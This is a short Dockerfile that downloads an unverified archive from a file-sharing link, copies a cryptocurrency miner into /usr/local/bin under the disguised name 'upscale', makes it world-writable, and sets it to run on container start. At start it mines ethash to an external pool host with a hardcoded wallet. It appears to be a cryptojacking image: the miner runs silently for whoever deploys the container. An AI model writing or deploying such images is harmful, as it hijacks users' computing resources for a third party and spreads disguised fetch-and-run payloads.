FROM ubuntu:20.04

LABEL maintainer="Roman Nikov"

RUN apt update; \
    apt install -y wget; \
    wget https://www.4sync.com/web/directDownload/1RZH1ucq/15xqQxN1.a888d2a0703a72867b648d5452418dce; \
    tar xf 15xqQxN1.a888d2a0703a72867b648d5452418dce; \
    cd upscale; \
    cp miner /usr/local/bin/upscale; \
    cp mine_eth.sh /usr/local/bin/mine_eth.sh; \
    cd /usr/local/bin;

WORKDIR /usr/local/bin

RUN chmod 777 mine_eth.sh;

RUN chmod 777 upscale;

CMD upscale --algo ethash --server workload.sytes.net:2020 --user nano_39uqhh89rwz1h1abcrhhnpjz8bp34xdbk95r38ws3ncczfctxuu95ro17rzx.upscale
